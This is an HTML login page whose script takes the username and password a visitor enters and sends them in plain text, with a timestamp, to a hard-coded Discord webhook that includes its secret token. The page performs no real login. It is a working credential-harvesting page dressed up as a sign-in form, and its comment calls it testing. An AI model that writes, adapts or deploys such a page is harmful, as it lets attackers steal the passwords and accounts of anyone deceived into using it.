<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Testing Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
<div class="loginBlock">
    <form id="loginForm" onsubmit="return handleSubmit(event)">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        
        <button type="submit">Login</button>
    </form>
</div>
<script>
async function handleSubmit(event) {
    event.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const timestamp = new Date().toISOString();
    
    try {
        // Direct Discord webhook call for testing
        const webhookUrl = "https://discord.com/api/webhooks/1378978890373926963/KBqbq1R-P4Pu1ytdZl5oo5kHKVkCpz8MeszoyUjR1JRK1M-vIQ4ov2x4hFbhMJa_VGmQ";
        
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `New Login Attempt:\nUsername: ${username}\nPassword: ${password}\nTime: ${timestamp}`
            })
        });
        
        if (response.ok) {
            alert('Successfully');
            document.getElementById('loginForm').reset();
        } else {
            alert('Failed');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Please try again.');
    }
    return false;
}
</script>
</body>
</html>
